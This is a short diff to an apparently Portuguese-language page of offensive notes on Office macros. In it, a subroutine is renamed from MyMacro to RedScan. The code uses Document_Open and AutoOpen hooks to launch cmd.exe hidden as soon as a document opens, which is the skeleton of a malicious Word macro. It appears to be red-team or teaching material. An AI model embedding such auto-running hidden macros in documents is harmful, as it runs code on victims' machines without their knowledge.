@@ -31,12 +31,12 @@ End Sub
 ## Abrir o CMD
 ```
 Sub Document_Open()
-    MyMacro
+    RedScan
 End Sub
 Sub AutoOpen()
-    MyMacro
+    RedScan
 End Sub
-Sub MyMacro()
+Sub RedScan()
     Dim str As String
     str = "cmd.exe"
     CreateObject("Wscript.Shell").Run str, 0
